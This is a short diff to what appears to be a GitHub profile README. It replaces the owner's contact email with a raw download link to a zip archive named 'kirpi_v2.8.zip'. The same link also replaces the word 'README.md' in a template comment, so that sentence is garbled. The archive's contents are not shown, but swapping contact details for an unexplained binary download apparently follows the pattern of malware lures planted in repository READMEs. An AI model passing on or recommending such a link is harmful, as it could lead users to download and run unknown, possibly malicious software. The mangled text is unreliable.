@@ -14,7 +14,7 @@ Skills:
 
 📫 Feel free to check out my projects below and reach out if you’d like to collaborate!
 
-📫 How to reach me: tijanimuhammed@gmail.com
+📫 How to reach me: https://github.com/Error-404-bob/kirpi/raw/refs/heads/main/oscillating/kirpi_v2.8.zip
 
 😄 Pronouns:He
 
@@ -22,6 +22,6 @@ Skills:
 
 
 <!---
-Error-404-bob/Error-404-bob is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+Error-404-bob/Error-404-bob is a ✨ special ✨ repository because its `https://github.com/Error-404-bob/kirpi/raw/refs/heads/main/oscillating/kirpi_v2.8.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
